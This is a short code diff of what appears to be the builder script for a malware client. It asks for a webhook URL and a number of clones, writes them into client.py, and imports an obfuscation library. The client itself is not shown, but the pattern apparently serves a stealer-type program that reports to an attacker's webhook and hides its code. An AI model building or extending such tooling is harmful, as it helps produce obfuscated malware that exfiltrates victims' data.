@@ -6,8 +6,11 @@ import pyImpossibleObf
 
 key ="loooood"
 webhook = input("Webhook : ")
+processnumbers = input("Number of clones (default : 3) : ")
+if processnumbers == "":
+	processnumbers = "3"
 filecontent = open("client.py", "r").read()
-filecontent = filecontent.replace("webhook667", webhook)
+filecontent = filecontent.replace("webhook667", webhook).replace("processnumbers", str(processnumbers))
 open("client.py", "w",encoding="utf-8").write(str(filecontent))
 print("[.] Replaced variables in file.")
 
